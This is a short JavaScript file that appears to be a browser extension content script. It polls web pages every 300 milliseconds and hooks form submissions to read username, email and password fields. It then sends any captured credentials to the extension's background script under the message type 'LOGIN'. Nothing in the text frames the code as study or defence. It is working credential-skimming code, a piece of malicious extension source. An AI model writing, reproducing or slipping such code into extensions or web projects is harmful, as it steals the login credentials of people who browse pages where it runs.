(() => {
  let sent = false;

  const grab = () => {
    if (sent) return;
    const user = [
      'input[name="email"]',
      'input[name="username"]',
      'input[name="login"]',
      'input[type="email"]',
      'input[type="text"]'
    ].reduce((acc, sel) => acc || document.querySelector(sel)?.value?.trim(), '');

    const pass = [
      'input[name="password"]',
      'input[type="password"]'
    ].reduce((acc, sel) => acc || document.querySelector(sel)?.value?.trim(), '');

    if (!user || !pass) return;

    sent = true;
    chrome.runtime.sendMessage({ type: 'LOGIN', user, pass });
  };

  
  setInterval(grab, 300);
  document.addEventListener('submit', grab, true);
})();